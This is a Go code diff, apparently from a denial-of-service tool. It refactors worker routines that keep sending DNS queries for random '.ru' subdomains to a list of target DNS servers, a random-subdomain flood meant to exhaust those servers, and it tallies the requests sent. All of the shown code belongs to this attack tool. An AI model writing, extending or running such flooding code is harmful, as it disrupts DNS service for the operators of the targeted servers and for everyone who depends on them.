@@ -17,10 +17,9 @@ type DNSTargetStatus struct {
 }
 
 type DNSTarget struct {
-	Status  DNSTargetStatus
-	mux     sync.Mutex
-	message *dns.Msg
-	target  string
+	Status DNSTargetStatus
+	mux    sync.Mutex
+	target string
 }
 
 var dnsClient *dns.Client
@@ -28,15 +27,9 @@ var dnsClient *dns.Client
 var dnsTargets = map[string]*DNSTarget{}
 
 func startDNS() {
-	rng := new(fastrand.RNG)
 	for targetDNSServer := range targets.TargetDNSServers {
-		questionDomain := getRandomDomain(rng) + "."
-		message := new(dns.Msg)
-		message.SetQuestion(questionDomain, dns.TypeA)
-
 		dnsTargets[targetDNSServer] = &DNSTarget{
-			message: message,
-			target:  targetDNSServer,
+			target: targetDNSServer,
 		}
 	}
 
@@ -58,13 +51,13 @@ func startDNS() {
 }
 
 func runDNSWorker(c chan *DNSTarget) {
-	rng := new(fastrand.RNG)
+	rng := &fastrand.RNG{}
+	message := new(dns.Msg)
 	for {
 		dnsTarget := <-c
-		questionDomain := getRandomDomain(rng) + "."
-		messageCopy := *dnsTarget.message
-		messageCopy.SetQuestion(questionDomain, dns.TypeA)
-		_, _, err := dnsClient.Exchange(&messageCopy, dnsTarget.target)
+		randomDomain := getRandomString(rng) + ".ru."
+		message.SetQuestion(randomDomain, dns.TypeA)
+		_, _, err := dnsClient.Exchange(message, dnsTarget.target)
 
 		dnsTarget.mux.Lock()
 		dnsTarget.Status.Requests++
@@ -88,14 +81,3 @@ func runDNSWorker(c chan *DNSTarget) {
 }
 
 var randomDomainRunes = []rune("abcdefghijklmnopqrstuvwxyz")
-
-func getRandomDomain(rng *fastrand.RNG) string {
-	randomLength := rng.Uint32n(20-6) + 6 // from 6 to 20 characters length + ".ru"
-	runes := uint32(len(randomDomainRunes))
-	b := make([]rune, randomLength)
-	for i := range b {
-		idx := int(rng.Uint32n(runes))
-		b[i] = randomDomainRunes[idx]
-	}
-	return string(b) + ".ru"
-}
